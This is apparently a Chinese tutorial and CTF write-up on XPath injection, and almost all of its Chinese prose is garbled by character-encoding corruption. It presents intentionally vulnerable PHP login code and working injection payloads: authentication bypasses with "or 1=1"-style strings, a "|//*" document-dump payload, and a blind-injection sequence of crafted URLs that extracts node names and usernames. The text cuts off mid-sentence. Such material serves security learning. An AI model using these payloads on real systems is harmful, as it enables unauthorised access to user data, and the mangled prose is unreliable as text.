åŒ¹é…ä»»ä½•å±æ€§èŠ‚ç‚¹ *: åŒ¹é…ä»»ä½•å…ƒç´ èŠ‚ç‚¹ å‡½æ•°ï¼š starts-with åŒ¹é…ä¸€ä¸ªå±æ€§å¼€å§‹ä½ç½®çš„å…³é”®å­— contains åŒ¹é…ä¸€ä¸ªå±æ€§å€¼ä¸­åŒ…å«çš„å­—ç¬¦ä¸² textï¼ˆï¼‰ åŒ¹é…çš„æ˜¯æ˜¾ç¤ºæ–‡æœ¬ä¿¡æ¯ //ä»£ç ç¤ºä¾‹: &lt;?xml version=\"1.0\" encoding=\"UTF-8\" ?&gt; &lt;students&gt; &lt;student number=\"1\"&gt; &lt;name id=\"zs\"&gt; &lt;xing&gt;å¼ &lt;/xing&gt; &lt;ming&gt;ä¸‰&lt;/ming&gt; &lt;/name&gt; &lt;age&gt;18&lt;/age&gt; &lt;sex&gt;male&lt;/sex&gt; &lt;/student&gt; &lt;student number=\"2\"&gt; &lt;name id = \"ls\"&gt;æå››&lt;/name&gt; &lt;age&gt;24&lt;/age&gt; &lt;sex&gt;female&lt;/sex&gt; &lt;/student&gt; &lt;/students&gt; //è¿™é‡Œæ ¹èŠ‚ç‚¹æ˜¯&lt;students&gt; //åƒ&lt;xing&gt;æˆ–è€…&lt;name&gt;è¿™äº›éƒ½å¯ä»¥å«å…ƒç´ èŠ‚ç‚¹ //id=\"zs\"è¿™äº›äº‹å±æ€§èŠ‚ç‚¹ ä¸Šè¾¹æ˜¯ä¸€ä¸ªç®€å•çš„XMLæ–‡æ¡£ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥ç”¨Xpathæ¥æŸ¥è¯­å¥ï¼ˆè¿™é‡Œç”¨pythonè¯­è¨€ä¸¾ä¾‹ï¼Œä½†è¿™é‡Œä¸çŸ¥ä¸ºä½•ï¼Œæˆ‘çš„pythonè¿è¡Œä¸äº†ï¼Œå¯èƒ½ç‰ˆæœ¬ä¸åŒ¹é…äº†ï¼‰ from lxml import etree xml =''' &lt;students&gt; &lt;student number=\"1\"&gt; &lt;name id=\"zs\"&gt; &lt;xing&gt;å¼ &lt;/xing&gt; &lt;ming&gt;ä¸‰&lt;/ming&gt; &lt;/name&gt; &lt;age&gt;18&lt;/age&gt; &lt;sex&gt;male&lt;/sex&gt; &lt;/student&gt; &lt;student number=\"2\"&gt; &lt;name id = \"ls\"&gt;æå››&lt;/name&gt; &lt;age&gt;24&lt;/age&gt; &lt;sex&gt;female&lt;/sex&gt; &lt;/student&gt; &lt;/students&gt; ''' tree = etree.XML(xml) #é€‰æ‰€æœ‰studentsï¼Œé€‰ç¬¬ä¸€ä¸ªå€¼-&gt;students-&gt;student-&gt;name-&gt;xingçš„æ–‡æœ¬ out = tree.xpath('//students')[0][0][0][0].text print(out) print('-------------------------------------') #æ‰€æœ‰nameå…ƒç´ ï¼Œç¬¬äºŒä¸ªä¹Ÿå°±æ˜¯æå››é‚£ä¸ª,é€‰å®ƒçš„æ–‡æœ¬ out = tree.xpath('//name')[1].text print(out) out = tree.xpath('//name')[1].xpath('@id') print(out) ä»¥ä¸‹ æ˜¯å¤§ä½¬çš„æˆåŠŸå±•ç¤ºæ¡ˆä¾‹(é€šè¿‡è¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½“ä¼šåˆ°ç±»ä¼¼äºsqlæŸ¥è¯¢çš„æ„Ÿè§‰) 0x03 XpathåŸºç¡€è¯­æ³• (1)æŸ¥è¯¢åŸºæœ¬è¯­å¥ //users/user[loginID/text()=â€™abcâ€™ and password/text()=â€™test123â€™] ã€‚ è¿™æ˜¯ä¸€ä¸ªXPathæŸ¥è¯¢è¯­å¥ï¼Œè·å–loginIDä¸ºabcçš„æ‰€æœ‰useræ•°æ®ï¼Œç”¨æˆ·éœ€è¦æäº¤æ­£ç¡®çš„loginIDå’Œpasswordæ‰èƒ½è¿”å›ç»“æœã€‚å¦‚æœé»‘å®¢åœ¨ loginID å­—æ®µä¸­è¾“å…¥ï¼šâ€™ or 1=1 å¹¶åœ¨ password ä¸­è¾“å…¥ï¼šâ€™ or 1=1 å°±èƒ½ç»•è¿‡æ ¡éªŒï¼ŒæˆåŠŸè·å–æ‰€æœ‰useræ•°æ®ã€‚ //users/user[LoginID/text()=''or 1=1 and password/text()=''or 1=1] (2)èŠ‚ç‚¹ç±»å‹ åœ¨XPathä¸­,XMLæ–‡æ¡£è¢«ä½œä¸ºèŠ‚ç‚¹æ ‘å¯¹å¾…,XPathä¸­æœ‰ä¸ƒç§ç»“ç‚¹ç±»å‹ï¼šå…ƒç´ ã€å±æ€§ã€æ–‡æœ¬ã€å‘½åç©ºé—´ã€å¤„ç†æŒ‡ä»¤ã€æ³¨é‡Šä»¥åŠæ–‡æ¡£èŠ‚ç‚¹ï¼ˆæˆ–ç§°ä¸ºæ ¹èŠ‚ç‚¹ï¼‰ã€‚ æ–‡æ¡£çš„æ ¹èŠ‚ç‚¹å³æ˜¯æ–‡æ¡£ç»“ç‚¹ï¼›å¯¹åº”å±æ€§æœ‰å±æ€§ç»“ç‚¹ï¼Œå…ƒç´ æœ‰å…ƒç´ ç»“ç‚¹ã€‚ element (å…ƒç´ ) attribute (å±æ€§) text (æ–‡æœ¬) namespace (å‘½åç©ºé—´) processing-instruction (å¤„ç†æŒ‡ä»¤) comment (æ³¨é‡Š) root (æ ¹èŠ‚ç‚¹) ä¾‹å¦‚ä¸‹é¢çš„XMLæ–‡æ¡£ &lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt; &lt;bookstore&gt; &lt;book&gt; &lt;title lang=\"en\"&gt;Harry Potter&lt;/title&gt; &lt;author&gt;J K. Rowling&lt;/author&gt; &lt;year&gt;2005&lt;/year&gt; &lt;price&gt;29.99&lt;/price&gt; &lt;/book&gt; &lt;/bookstore &lt;bookstore&gt; æ ¹èŠ‚ç‚¹ &lt;author&gt;J K. Rowling&lt;/author&gt; å…ƒç´ èŠ‚ç‚¹ lang=\"en\" å±æ€§èŠ‚ç‚¹ ä¸‹é¢æ˜¯ä¸€ä¸ªåŒ¹é…èŠ‚ç‚¹çš„å®ä¾‹ &lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt; &lt;bookstore&gt; &lt;book&gt; &lt;title lang=\"eng\"&gt;Harry Potter&lt;/title&gt; &lt;price&gt;29.99&lt;/price&gt; &lt;/book&gt; &lt;book&gt; &lt;title lang=\"eng\"&gt;Learning XML&lt;/title&gt; &lt;price&gt;39.95&lt;/price&gt; &lt;/book&gt; &lt;/bookstore&gt; è·¯å¾„è¡¨è¾¾å¼ç»“æœ (4)é™å®šè¯­ é™å®šè¯­æ˜¯å¯¹è·¯å¾„è¡¨è¾¾å¼çš„é™„åŠ æ¡ä»¶,ç”¨æ¥æŸ¥æ‰¾æŸä¸ªç‰¹å®šçš„èŠ‚ç‚¹æˆ–è€…åŒ…å«æŸä¸ªæŒ‡å®šçš„å€¼çš„èŠ‚ç‚¹.é™å®šè¯­è¢«åµŒåœ¨æ–¹æ‹¬å·ä¸­ï¼Œè·¯å¾„è¡¨è¾¾å¼ç»“æœï¼š (5)é€šé…ç¬¦ XPath é€šé…ç¬¦å¯ç”¨æ¥é€‰å–æœªçŸ¥çš„ XML å…ƒç´ . å®ä¾‹ï¼š æ›´å¤šç»†èŠ‚å‚è€ƒ:Xpa`thæ³¨å…¥ 0x04XPathæ³¨å…¥çš„å®šä¹‰ â€‹ XPathæ³¨å…¥æ”»å‡»ï¼Œæ˜¯æŒ‡åˆ©ç”¨XPath è§£æå™¨çš„æ¾æ•£è¾“å…¥å’Œå®¹é”™ç‰¹æ€§ï¼Œèƒ½å¤Ÿåœ¨ URLã€è¡¨å•æˆ–å…¶å®ƒä¿¡æ¯ä¸Šé™„å¸¦æ¶æ„çš„XPath æŸ¥è¯¢ä»£ç ï¼Œä»¥è·å¾—æƒé™ä¿¡æ¯çš„è®¿é—®æƒå¹¶æ›´æ”¹è¿™äº›ä¿¡æ¯ã€‚XPathæ³¨å…¥æ”»å‡»æ˜¯é’ˆå¯¹WebæœåŠ¡åº”ç”¨æ–°çš„æ”»å‡»æ–¹æ³•ï¼Œå®ƒå…è®¸æ”»å‡»è€…åœ¨äº‹å…ˆä¸çŸ¥é“XPathæŸ¥è¯¢ç›¸å…³çŸ¥è¯†çš„æƒ…å†µä¸‹ï¼Œé€šè¿‡XPathæŸ¥è¯¢å¾—åˆ°ä¸€ä¸ªXMLæ–‡æ¡£çš„å®Œæ•´å†…å®¹ã€‚Xpathæ³¨å…¥æ”»å‡»æœ¬è´¨ä¸Šå’ŒSQLæ³¨å…¥æ”»å‡»æ˜¯ç±»ä¼¼çš„ï¼Œéƒ½æ˜¯è¾“å…¥ä¸€äº›æ¶æ„çš„æŸ¥è¯¢ç­‰ä»£ç å­—ç¬¦ä¸²ï¼Œä»è€Œå¯¹ç½‘ç«™è¿›è¡Œæ”»å‡»ã€‚ â€‹ XPathæ³¨å…¥å‘ç”Ÿåœ¨å½“ç«™ç‚¹ä½¿ç”¨ç”¨æˆ·è¾“å…¥çš„ä¿¡æ¯æ¥æ„é€ è¯·æ±‚ä»¥è·å–XMLæ•°æ®ã€‚æ”»å‡»è€…å¯¹ç«™ç‚¹å‘é€ç»è¿‡ç‰¹æ®Šæ„é€ çš„ä¿¡æ¯æ¥æ¢ç©¶ç«™ç‚¹ä½¿ç”¨çš„XMLæ˜¯å¦‚ä½•æ„é€ çš„ï¼Œä»è€Œè¿›ä¸€æ­¥è·å–æ­£å¸¸é€”å¾„ä¸‹æ— æ³•è·å–çš„æ•°æ®ã€‚å½“XMLæ•°æ®è¢«ç”¨ä½œè´¦æˆ·éªŒè¯æ—¶ï¼Œæ”»å‡»è€…è¿˜å¯ä»¥æå‡ä»–çš„æƒé™ã€‚ 0x05 xpathæ³¨å…¥åŸç† â€‹ xpathæ³¨å…¥çš„åŸç†å…¶å®å’Œsqlæ³¨å…¥å¾ˆåƒï¼Œ XPathæ³¨å…¥æ”»å‡»ä¸»è¦æ˜¯é€šè¿‡æ„å»ºç‰¹æ®Šçš„è¾“å…¥ï¼Œè¿™äº›è¾“å…¥å¾€å¾€æ˜¯XPathè¯­æ³•ä¸­çš„ä¸€äº›ç»„åˆï¼Œè¿™äº›è¾“å…¥å°†ä½œä¸ºå‚æ•°ä¼ å…¥Web åº”ç”¨ç¨‹åºï¼Œé€šè¿‡æ‰§è¡ŒXPathæŸ¥è¯¢è€Œæ‰§è¡Œå…¥ä¾µè€…æƒ³è¦çš„æ“ä½œï¼Œ**ä½†æ˜¯ï¼Œæ³¨å…¥çš„å¯¹è±¡ä¸æ˜¯æ•°æ®åº“usersè¡¨äº†ï¼Œè€Œæ˜¯ä¸€ä¸ªå­˜å‚¨æ•°æ®çš„XMLæ–‡ä»¶ã€‚**æ”»å‡»è€…å¯ä»¥è·å– XML æ•°æ®çš„ç»„ç»‡ç»“æ„ï¼Œæˆ–è€…è®¿é—®åœ¨æ­£å¸¸æƒ…å†µä¸‹ä¸å…è®¸è®¿é—®çš„æ•°æ®ï¼Œå¦‚æœ XML æ•°æ®è¢«ç”¨äºç”¨æˆ·è®¤è¯ï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±å¯ä»¥æå‡ä»–çš„æƒé™ã€‚ â€‹ å› ä¸ºxpathä¸å­˜åœ¨è®¿é—®æ§åˆ¶ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸ä¼šé‡åˆ°è®¸å¤šåœ¨SQLæ³¨å…¥ä¸­ç»å¸¸é‡åˆ°çš„è®¿é—®é™åˆ¶ã€‚XML ä¸­æ²¡æœ‰è®¿é—®æ§åˆ¶æˆ–è€…ç”¨æˆ·è®¤è¯ï¼Œå¦‚æœç”¨æˆ·æœ‰æƒé™ä½¿ç”¨ XPath æŸ¥è¯¢ï¼Œå¹¶ä¸”ä¹‹é—´æ²¡æœ‰é˜²å¾¡ç³»ç»Ÿæˆ–è€…æŸ¥è¯¢è¯­å¥æ²¡æœ‰è¢«é˜²å¾¡ç³»ç»Ÿè¿‡æ»¤ï¼Œé‚£ä¹ˆç”¨æˆ·å°±èƒ½å¤Ÿè®¿é—®æ•´ä¸ª XML æ–‡æ¡£ã€‚ æ³¨å…¥å‡ºç°çš„ä½ç½®ä¹Ÿå°±æ˜¯cookieï¼Œheadersï¼Œrequest parameters/inputç­‰ã€‚ä¸‹é¢ä»¥ç™»å½•éªŒè¯ä¸­çš„æ¨¡å—ä¸ºä¾‹ï¼Œè¯´æ˜ XPathæ³¨å…¥æ”»å‡»çš„å®ç°åŸç†ã€‚ â€‹ åœ¨Web åº”ç”¨ç¨‹åºçš„ç™»å½•éªŒè¯ç¨‹åºä¸­ï¼Œä¸€èˆ¬æœ‰ç”¨æˆ·åï¼ˆusernameï¼‰å’Œå¯†ç ï¼ˆpasswordï¼‰ ä¸¤ä¸ªå‚æ•°ï¼Œç¨‹åºä¼šé€šè¿‡ç”¨æˆ·æ‰€æäº¤è¾“å…¥çš„ç”¨æˆ·åå’Œå¯†ç æ¥æ‰§è¡Œæˆæƒæ“ä½œã€‚è‹¥éªŒè¯æ•°æ®å­˜æ”¾åœ¨XMLæ–‡ä»¶ä¸­ï¼Œå…¶åŸç†æ˜¯é€šè¿‡æŸ¥æ‰¾userè¡¨ä¸­çš„ç”¨æˆ·å ï¼ˆusernameï¼‰å’Œå¯†ç ï¼ˆpasswordï¼‰çš„ç»“æœæ¥è¿›è¡Œæˆæƒè®¿é—®ã€‚ ä¾‹å­˜åœ¨user.xmlæ–‡ä»¶å¦‚ä¸‹ï¼š &lt;users&gt; &lt;user&gt; &lt;firstname&gt;Ben&lt;/firstname&gt; &lt;lastname&gt;Elmore&lt;/lastname&gt; &lt;loginID&gt;abc&lt;/loginID&gt; &lt;password&gt;test123&lt;/password&gt; &lt;/user&gt; &lt;user&gt; &lt;firstname&gt;Shlomy&lt;/firstname&gt; &lt;lastname&gt;Gantz&lt;/lastname&gt; &lt;loginID&gt;xyz&lt;/loginID&gt; &lt;password&gt;123test&lt;/password&gt; &lt;/user&gt; åˆ™åœ¨XPathä¸­å…¶å…¸å‹çš„æŸ¥è¯¢è¯­å¥å¦‚ä¸‹ï¼š //users/user[loginID/text()='xyz'and password/text()='123test'] ä½†æ˜¯ï¼Œå¯ä»¥é‡‡ç”¨å¦‚ä¸‹çš„æ–¹æ³•å®æ–½æ³¨å…¥æ”»å‡»ï¼Œç»•è¿‡èº«ä»½éªŒè¯ã€‚å¦‚æœç”¨ æˆ·ä¼ å…¥ä¸€ä¸ª login å’Œ passwordï¼Œä¾‹å¦‚ loginID = â€˜xyzâ€™ å’Œ password = â€˜123testâ€™ï¼Œåˆ™è¯¥æŸ¥è¯¢è¯­å¥å°†è¿”å› trueã€‚ä½†å¦‚æœç”¨æˆ·ä¼ å…¥ç±»ä¼¼ â€™ or 1=1 or â€˜â€™=â€™ çš„å€¼ï¼Œé‚£ä¹ˆè¯¥æŸ¥è¯¢è¯­å¥ä¹Ÿä¼šå¾—åˆ° true è¿”å›å€¼ï¼Œå› ä¸º XPath æŸ¥è¯¢è¯­å¥æœ€ç»ˆä¼šå˜æˆå¦‚ä¸‹ä»£ç ï¼š //users/user[loginID/text()=''or 1=1 or ''='' and password/text()='' or 1=1 or ''=''] â€‹ è¿™ä¸ªå­—ç¬¦ä¸²ä¼šåœ¨é€»è¾‘ä¸Šä½¿æŸ¥è¯¢ä¸€ç›´è¿”å› true å¹¶å°†ä¸€ç›´å…è®¸æ”»å‡»è€…è®¿é—®ç³»ç»Ÿã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨ XPath åœ¨åº”ç”¨ç¨‹åºä¸­åŠ¨æ€åœ°æ“ä½œ XML æ–‡æ¡£ã€‚æ”»å‡»å®Œæˆç™»å½•å¯ä»¥å†é€šè¿‡XPathæ³¨å…¥æŠ€æœ¯è·å–æœ€é«˜æƒé™å¸å·å’Œå…¶å®ƒé‡è¦æ–‡æ¡£ä¿¡æ¯ã€‚å»¶å±•å¼€æ¥ï¼Œxpathçš„æ³¨å…¥è¿˜æœ‰å¾ˆå¤šèŠ±æ ·ï¼Œåƒæ˜¯é€šè¿‡updataxml()å‡½æ•°å®ç°xpthæŠ¥é”™æ³¨å…¥ï¼Œè¿˜æœ‰xpthçš„ç›²æ³¨ã€‚ 0x06 ä¸‹é¢åŠ¨æ‰‹å®æ“(ä»¥ä¸‹éƒ½æ˜¯è·Ÿç€ä½¬åšçš„) Xpathå®ä¾‹1 ä¸»æµè„šæœ¬è¯­è¨€éƒ½æ”¯æŒå¯¹XPathçš„å¤„ç†,ä¸‹é¢æˆ‘ä»¥PHPæ¥å­¦ä¹ XPathæ³¨å…¥çš„åŸç†ï¼š blog.xml &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;root&gt; &lt;users&gt; &lt;user&gt; &lt;id&gt;1&lt;/id&gt; &lt;username&gt;admin&lt;/username&gt; &lt;password type=\"md5\"&gt;0192023a7bbd73250516f069df18b500&lt;/password&gt; &lt;/user&gt; &lt;user&gt; &lt;id&gt;2&lt;/id&gt; &lt;username&gt;jack&lt;/username&gt; &lt;password type=\"md5\"&gt;1d6c1e168e362bc0092f247399003a88&lt;/password&gt; &lt;/user&gt; &lt;user&gt; &lt;id&gt;3&lt;/id&gt; &lt;username&gt;tony&lt;/username&gt; &lt;password type=\"md5\"&gt;cc20f43c8c24dbc0b2539489b113277a&lt;/password&gt; &lt;/user&gt; &lt;/users&gt; &lt;secret&gt; &lt;flag&gt;flag{My_f1rst_xp4th_iNjecti0n}&lt;/flag&gt; &lt;/secret&gt; &lt;/root&gt; index.php &lt;?php $xml=simplexml_load_file('blog.xml'); $name=$_GET['name']; $pwd=md5($_GET['pwd']); $query= \"/root/users/user[username/text()='\".$name.\"' and password/text()='\".$pwd.\"']\"; echo $query; $result = $xml-&gt;xpath($query); if($result) { echo '&lt;h2&gt;Welcome&lt;/h2&gt;'; foreach ($result as $key =&gt; $value) { echo '&lt;br /&gt;ID:'.$value-&gt;id; echo '&lt;br /&gt;Username:'.$value-&gt;username; } } ?&gt; ä»£ç å¾ˆç®€å•,å®ç°äº†ä¸€ä¸ªç®€å•çš„ç™»é™†éªŒè¯åŠŸèƒ½.å…¶å®å’ŒSQLæ³¨å…¥ç›¸ä¼¼,æ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥çš„æ•°æ®åšè¿‡æ»¤,å¯¼è‡´æ”»å‡»è€…å¯ä»¥ç›´æ¥æ³¨å…¥â€XPathè¡¨è¾¾å¼â€ï¼Œåªè¦çŸ¥é“ç”¨æˆ·åå°±èƒ½ç»•è¿‡å¯†ç éªŒè¯. payload: ?name=admin' or '1'='1&amp;pwd='' å¦‚æœç”¨æˆ·åæ²¡æ³•å¾—çŸ¥,å¯ä»¥ç”¨ä¸¤ä¸ªâ€orâ€æ¥ç»•è¿‡éªŒè¯é€»è¾‘ payload: ?name=fake' or '1' or '1&amp;pwd=fake Xpathå®ä¾‹äºŒ è¿™é‡Œç”¨ä¸€é“èµ›é¢˜æ¥ä¸¾ä¾‹ï¼š &lt;?php $re = array('and','or','count','select','from','union','group','by','limit','insert','where','order','alter','delete','having','max','min','avg','sum','sqrt','rand','concat','sleep'); setcookie('injection','c3FsaSBpcyBub3QgdGhlIG9ubHkgd2F5IGZvciBpbmplY3Rpb24=',time()+100000); if(file_exists('t3stt3st.xml')) { $xml = simplexml_load_file('t3stt3st.xml'); $user=$_GET['user']; $user=str_replace($re, ' ', $user); //$user=str_replace(\"'\", \"&amp;apos\", $user); $query=\"user/username[@name='\".$user.\"']\"; $ans = $xml-&gt;xpath($query); foreach($ans as $x =&gt; $x_value) { echo $x.\": \" . $x_value; echo \"&lt;br /&gt;\"; } } â€‹ é€šè¿‡è®¿é—®/download.php?file=backup.zipä¸‹è½½ç½‘é¡µæºç ï¼Œé¦–å…ˆçœ‹åˆ°ä»–è¿‡æ»¤äº†sqlæ³¨å…¥çš„ä¸€äº›å…³é”®å­—ï¼Œsetcookieä¸­æœ‰ä¸€æ®µbase64åŠ å¯†çš„å¯†æ–‡ï¼Œè§£ç åå¾—åˆ°çš„æ˜¯ï¼šâ€œsqli is not the only way for injectionâ€ï¼Œæ ¹æ®æç¤ºsqlä¸æ˜¯å”¯ä¸€çš„æ³¨å…¥æ–¹å¼ï¼Œå†ç»“åˆä¸‹é¢å¯¹xmlçš„ä¸€ç³»åˆ—æ“ä½œï¼Œå¯ä»¥ç¡®å®šè¿™é“é¢˜æ˜¯ç”¨xpathæ³¨å…¥ï¼Œäºæ˜¯æ ¹æ®$query=â€œuser/username[@name='â€.$user.â€œ']â€;è¿™ä¸€å¥å¯æ„é€ å¦‚ä¸‹payload: $query=\"user/username[@name='']|//*|ss['']\"; è¿™ä¸ªpayloadä¸­çš„ |ss ä¸å¤ªæ‡‚â€¦ è¿™å¥payloadçš„æ„æ€æ˜¯é—­åˆäº†â€œ.$user.â€å‰åçš„å•å¼•å·åŒæ—¶æ‰§è¡Œä¸‰ä¸ªæ“ä½œï¼Œå…¶ä¸­ç¬¬äºŒä¸ªæ“ä½œ//*å³æ˜¯å…³é”®ç‚¹ï¼Œåˆ—å‡ºæ–‡æ¡£ä¸­çš„æ‰€æœ‰å…ƒç´ ï¼Œæœ€åæ‹¿åˆ°flag æµ…æµ…åˆ†æä¸€ä¸‹:\tè¿™é‡Œç”¨|çš„åŸå› æ˜¯ä¸ºäº†è®©è¯¥æŸ¥è¯¢è¯­å¥è¿”å›true,å› ä¸º,userå‰åå‡ä¸ºå‡,è€Œ //* ä¼šè¿”å›æ–‡æ¡£æ‰€æœ‰å…ƒç´ ,å› æ­¤ä¸ºçœŸ xpath å®åˆ—åŸç†ä¸‰ è¿™è¾¹æœ‰ä¸ªå­˜æ”¾åˆ†æ•°çš„xmlæ–‡ä»¶ï¼š score.xml: &lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; &lt;root&gt; &lt;class num='1'&gt; &lt;peo name='tom'&gt; &lt;subject&gt; &lt;foo&gt;english&lt;/foo&gt; &lt;score&gt;60&lt;/score&gt; &lt;/subject&gt; &lt;subject&gt; &lt;foo&gt;chinese&lt;/foo&gt; &lt;score&gt;70&lt;/score&gt; &lt;/subject&gt; &lt;password&gt;qwer123&lt;/password&gt; &lt;/peo&gt; &lt;peo name='helen'&gt; &lt;subject&gt; &lt;foo&gt;english&lt;/foo&gt; &lt;score&gt;24&lt;/score&gt; &lt;/subject&gt; &lt;subject&gt; &lt;foo&gt;chinese&lt;/foo&gt; &lt;score&gt;34&lt;/score&gt; &lt;/subject&gt; &lt;password&gt;woaichishi&lt;/password&gt; &lt;/peo&gt; &lt;peo name='vk'&gt; &lt;subject&gt; &lt;foo&gt;english&lt;/foo&gt; &lt;score&gt;100&lt;/score&gt; &lt;/subject&gt; &lt;subject&gt; &lt;foo&gt;chinese&lt;/foo&gt; &lt;score&gt;100&lt;/score&gt; &lt;/subject&gt; &lt;password&gt;vk123&lt;/password&gt; &lt;/peo&gt; &lt;/class&gt; &lt;/root&gt; æŸ¥è¯¢åˆ†æ•°çš„phpæ˜¯ï¼š score.php &lt;?php if (file_exists('score.xml')){ $xml = simplexml_load_file('score.xml'); //è·å–xmlæ–‡ä»¶é‡Œé¢çš„æ•°æ® if (isset($_GET['user'])){ $user = $_GET['user']; //æ„é€ è¯­å¥ $en_scr = \"//peo[@name='{$user}']/subject[contains(foo, 'english')]/score\"; $ch_scr = \"//peo[@name='{$user}']/subject[contains(foo, 'chinese')]/score\"; $en_qu = $xml -&gt; xpath($en_scr); $ch_qu = $xml -&gt; xpath($ch_scr); foreach ($en_qu as $key =&gt; $value) { echo $user.':&lt;br&gt;english is '.$value; } foreach ($ch_qu as $key =&gt; $value) { echo '&lt;br&gt;'.'chinese is '.$value; } }else{ echo 'only have three user: vk, tom, helen.'; } } ?&gt; è¿™é‡Œï¼Œphpç”¨simplexml_load_file()è¿™ä¸ªå‡½æ•°æ¥è®¿é—®é‚£ä¸ªå­˜åˆ†æ•°çš„xmlæ–‡ä»¶,ç„¶åç”¨xpathè¯­æ³•å»æŸ¥è¯¢æ•°æ®ã€‚ä¼šphpè¯­è¨€çš„æ…¢æ…¢çœ‹ï¼ˆé‡è¦ï¼å¯åŠ æ·±ç†è§£ï¼‰ï¼Œä¸ä¼šçš„è·³è¿‡ï¼Œå…ˆçœ‹æ•ˆæœï¼š ä»–è¯´åªæœ‰ä¸‰ä¸ªç”¨æˆ·ï¼Œé‚£æˆ‘ä»¬æ¥æŸ¥æŸ¥helençš„åˆ†æ•°å§ å¥½äº†ï¼Œåè¿‡æ¥çœ‹çœ‹ä»£ç ï¼Œå®ƒæ˜¯æ€ä¹ˆå®ç°å¯¹xmlæ–‡ä»¶çš„æŸ¥è¯¢çš„ï¼Ÿ $en_scr = \"//peo[@name='{$user}']/subject[contains(foo, 'english')]/score\"; $ch_scr = \"//peo[@name='{$user}']/subject[contains(foo, 'chinese')]/score\"; å›¾ä¸­æ¡†è¿™ä¸ªå°±ç›¸å½“äºSqlä¸­çš„è¯­å¥ï¼Œè¿™å°±æ˜¯xpathè·¯å¾„é€‰å–xmlèŠ‚ç‚¹çš„è¯­å¥ã€‚ ç›´æ¥è§£é‡ŠæŸ¥è¯¢è¯­å¥/peo åŒ¹é…åˆ°æ‰€æœ‰peoèŠ‚ç‚¹ è¿™èŠ‚ç‚¹ä¸æ­¢ä¸€ä¸ªï¼Œåˆ°åº•è¦å“ªä¸ªå‘¢ï¼Ÿ [@name='{$user}'] æ¥æ”¶åˆ°ç”¨æˆ·åå­—ï¼Œæ¥æŸ¥è¯¢ç›¸åº”çš„èŠ‚ç‚¹ï¼ˆå°±æ˜¯åˆšæ‰çš„helen,vkï¼‰ /subject åˆšæ‰peoèŠ‚ç‚¹ä¸‹çš„subjectèŠ‚ç‚¹ è¿™æ—¶å€™é—®é¢˜åˆæ¥äº†ï¼ŒsubjectèŠ‚ç‚¹ä¸æ­¢ä¸€ä¸ªï¼Œå“ªä¸ªå‘¢ï¼Ÿ [contains(foo, 'english')] containså‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ç»™å‡ºèŠ‚ç‚¹åï¼Œç¬¬äºŒä¸ªå†™å­—ç¬¦ä¸²æ„æ€å°±æ˜¯ï¼ŒåŒ¹é…å‡ºä»–çš„fooå­èŠ‚ç‚¹ä¸­ï¼Œä¿¡æ¯å«æœ‰englishçš„é‚£ä¸ª/score å·²ç»æ‰¾åˆ°ç›¸åº”çš„subjectäº†ï¼Œç„¶åå°±æ˜¯æ‰¾åˆ†æ•°äº†ã€‚Scoreå°±æ˜¯å­˜æ”¾åˆ†æ•°çš„èŠ‚ç‚¹ï¼š è¿™æ ·å°±èƒ½å®ç°ä»xmlæ–‡ä»¶ä¸­æŸ¥è¯¢ç›¸åº”æ•°æ®äº†! 0x07 XPathç›²æ³¨çš„æ–¹æ³• ç›²æ³¨ä¸»è¦åˆ©ç”¨XPathçš„ä¸€äº›å­—ç¬¦ä¸²æ“ä½œå‡½æ•°å’Œè¿ç®—ç¬¦. ä»¥å‰æ–‡çš„ç¯å¢ƒä¸ºä¾‹,å¦‚æœæˆ‘ä»¬æƒ³éå†å‡ºæ•´ä¸ªXMLæ–‡æ¡£,ä¸€èˆ¬æ­¥éª¤å¦‚ä¸‹: 1.åˆ¤æ–­æ ¹ä¸‹èŠ‚ç‚¹æ•°:(ä½“ç°å‡ºæ¥çš„å°±æ˜¯å›æ˜¾æ­£å¸¸,ä»¥ä¸‹å‡æ˜¯) 127.0.0.1/xpath/index.php?name=1' or count(/*)=1 or '1'='1&amp;pwd=fake result: 1 2.çŒœè§£ç¬¬ä¸€çº§èŠ‚ç‚¹: 127.0.0.1/xpath/index.php?name=1' or substring(name(/*[position()=1]),1,1)='r' or '1'='1&amp;pwd=fake 127.0.0.1/xpath/index.php?name=1' or substring(name(/*[position()=1]),2,1)='o' or '1'='1&amp;pwd=fake ... result: root 3.åˆ¤æ–­rootçš„ä¸‹ä¸€çº§èŠ‚ç‚¹æ•°: 127.0.0.1/xpath/index.php?name=1' or count(/root/*)=2 or '1'='1&amp;pwd=fake result: 2 4.çŒœè§£rootçš„ä¸‹ä¸€çº§èŠ‚ç‚¹: 127.0.0.1/xpath/index.php?name=1' or substring(name(/root/*[position()=1]),1,1)='u' or '1'='1&amp;pwd=fake 127.0.0.1/xpath/index.php?name=1' or substring(name(/root/*[position()=2]),1,1)='s' or '1'='1&amp;pwd=fake result: users,secret é‡å¤ä¸Šè¿°æ­¥éª¤ç›´åˆ°çŒœè§£å‡ºæ‰€æœ‰èŠ‚ç‚¹ï¼Œæœ€åæ¥çŒœè§£èŠ‚ç‚¹ä¸­çš„æ•°æ®æˆ–å±æ€§å€¼ã€‚ 5ã€çŒœè§£idä¸º1çš„userèŠ‚ç‚¹ä¸‹çš„usernameå€¼, 127.0.0.1/xpath/index.php?name=1' or substring(/root/users/user[id=1]/username,1,1)='a' or '1'='1&amp;pwd=fake ... result: admin 0x08 XPathæ”»å‡»çš„å®åˆ— ä¸€èˆ¬è¯´æ¥ï¼Œå¤§å¤šæ•° Web åº”ç”¨ç¨‹åºä½¿ç”¨å…³ç³»æ•°æ®åº“å­˜å‚¨å’Œæ£€ç´¢ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ‚¨çš„ Web ç«™ç‚¹éœ€è¦èº«ä»½éªŒè¯ï¼Œé‚£ä¹ˆæ‚¨å¯èƒ½æ‹¥æœ‰ä¸€ä¸ª users è¡¨ï¼Œå…¶ä¸­åŒ…å«æƒŸä¸€ IDã€ç™»å½•åã€å¯†ç 